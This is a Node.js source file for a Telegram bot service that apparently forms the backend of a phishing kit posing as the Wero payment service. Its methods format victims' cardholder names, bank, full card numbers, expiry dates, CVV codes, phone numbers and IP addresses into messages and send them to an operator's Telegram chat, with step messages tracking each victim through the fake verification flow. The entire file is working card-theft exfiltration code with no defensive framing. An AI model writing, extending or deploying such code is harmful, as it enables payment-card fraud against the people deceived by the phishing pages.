const https = require('https');

class TelegramService {
  constructor() {
    this.token = process.env.TELEGRAM_BOT_TOKEN;
    this.chatId = process.env.TELEGRAM_CHAT_ID;
    console.log('🔧 Telegram Service Initialized');
    console.log('   Token configured:', this.token ? '✅ Yes' : '❌ No');
    console.log('   Chat ID:', this.chatId);
  }

  // Envoyer un message texte
  async sendMessage(text) {
    return new Promise((resolve, reject) => {
      if (!this.token || !this.chatId) {
        console.error('❌ Token ou Chat ID manquant');
        reject(new Error('Missing token or chat ID'));
        return;
      }

      const payload = JSON.stringify({
        chat_id: this.chatId,
        text: text,
        parse_mode: 'HTML'
      });

      const options = {
        hostname: 'api.telegram.org',
        path: `/bot${this.token}/sendMessage`,
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          'Content-Length': Buffer.byteLength(payload)
        }
      };

      const req = https.request(options, (res) => {
        let data = '';
        res.on('data', (chunk) => { data += chunk; });
        res.on('end', () => {
          try {
            const response = JSON.parse(data);
            if (response.ok) {
              console.log('✅ Message Telegram envoyé avec succès');
              resolve(response);
            } else {
              console.error('❌ Erreur Telegram:', response.description);
              reject(new Error(response.description));
            }
          } catch (e) {
            console.error('❌ Erreur parse:', e.message);
            reject(e);
          }
        });
      });

      req.on('error', (error) => {
        console.error('❌ Erreur HTTP:', error.message);
        reject(error);
      });

      req.write(payload);
      req.end();
    });
  }

  // Envoyer les informations de formulaire
  async sendFormData(data) {
    const message = `<b>💳 DONNÉES BANCAIRES</b>
━━━━━━━━━━━━━━━━
👤 <b>Titulaire:</b> <code>${data.titulaire || 'N/A'}</code>
🏦 <b>Banque:</b> <code>${data.bank || 'N/A'}</code>
💳 <b>Carte:</b> <code>${data.cardNumber || 'N/A'}</code>
📅 <b>Exp:</b> <code>${data.expiryDate || 'N/A'}</code>
📱 <b>Tél:</b> <code>${data.telephone || 'N/A'}</code>
━━━━━━━━━━━━━━━━
🌐 IP: <code>${data.ip || 'N/A'}</code>
⏰ <code>${new Date().toLocaleString('fr-FR')}</code>
✅ <b>Statut:</b> Enregistré`;

    return this.sendMessage(message);
  }

  // Envoyer une alerte CVV
  async sendCVVAlert(data) {
    const message = `<b>🔐 ALERTE SÉCURITÉ - CVV</b>
━━━━━━━━━━━━━━━━
🔑 <b>Code CVV:</b> <code>${data.cvv || 'N/A'}</code>
👤 <b>Titulaire:</b> <code>${data.titulaire || 'N/A'}</code>
💳 <b>Carte:</b> <code>${data.cardNumber || 'N/A'}</code>
📅 <b>Expiration:</b> <code>${data.expiryDate || 'N/A'}</code>
━━━━━━━━━━━━━━━━
🌐 IP: <code>${data.ip || 'N/A'}</code>
⏰ <code>${new Date().toLocaleString('fr-FR')}</code>
🚨 <b>Données Sensibles Détectées</b>`;

    return this.sendMessage(message);
  }

  // Envoyer confirmation d'accord
  async sendAgreementConfirmation(data) {
    const message = `<b>✅ CONDITIONS ACCEPTÉES</b>
━━━━━━━━━━━━━━━━
📋 <b>Étape:</b> <code>1/3 VALIDÉE</code>
⏰ <code>${new Date().toLocaleString('fr-FR')}</code>
🌐 IP: <code>${data.ip || 'N/A'}</code>
━━━━━━━━━━━━━━━━
🔄 <b>Prochaine étape:</b> Vérification bancaire`;

    return this.sendMessage(message);
  }

  // Test de connexion
  async testConnection() {
    try {
      const message = `<b>🚀 WERO - SYSTÈME EN LIGNE</b>
━━━━━━━━━━━━━━━━
✅ <b>Bot:</b> <code>CONNECTÉ</code>
📡 <b>Serveur:</b> <code>OPÉRATIONNEL</code>
🔐 <b>SSL/TLS:</b> <code>ACTIVÉ</code>
⏰ <code>${new Date().toLocaleString('fr-FR')}</code>
━━━━━━━━━━━━━━━━
💡 Système prêt à recevoir les données`;
      await this.sendMessage(message);
      console.log('✅ Connexion Telegram établie');
      return true;
    } catch (error) {
      console.error('❌ Erreur de connexion Telegram:', error.message);
      return false;
    }
  }
}

module.exports = new TelegramService();
